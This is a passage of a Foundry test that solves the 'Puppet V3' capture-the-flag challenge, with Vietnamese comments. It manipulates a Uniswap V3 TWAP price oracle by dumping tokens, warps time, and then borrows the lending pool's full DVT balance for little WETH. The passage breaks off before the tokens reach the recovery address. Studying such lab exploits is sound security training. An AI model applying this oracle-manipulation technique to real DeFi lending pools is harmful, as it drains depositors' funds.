...
contract PuppetV3Challenge is Test {
    ...
    function test_puppetV3() public checkSolvedByPlayer {
        ...
        // Thuc hien hoan doi de thao tung DVT
        uint256 amountOut = ISwapRouter(uniSwapRouterAddress).exactInputSingle(
                ISwapRouter.ExactInputSingleParams(address(token), address(weth), FEE, player, block.timestamp + 5, PLAYER_INITIAL_TOKEN_BALANCE, 0, 0)
            ); 
        
        // Bo qua 1 thoi gian de TWAP dinh gia lai DVT
        vm.warp(block.timestamp + 114);

        // Vay DVT voi WETH da bi thao tung
        uint256 amountNeed = lendingPool.calculateDepositOfWETHRequired(LENDING_POOL_INITIAL_TOKEN_BALANCE);
        weth.approve(address(lendingPool), amountNeed);
        lendingPool.borrow(LENDING_POOL_INITIAL_TOKEN_BALANCE);

        // Chuyen toan bo DVT toi recovery
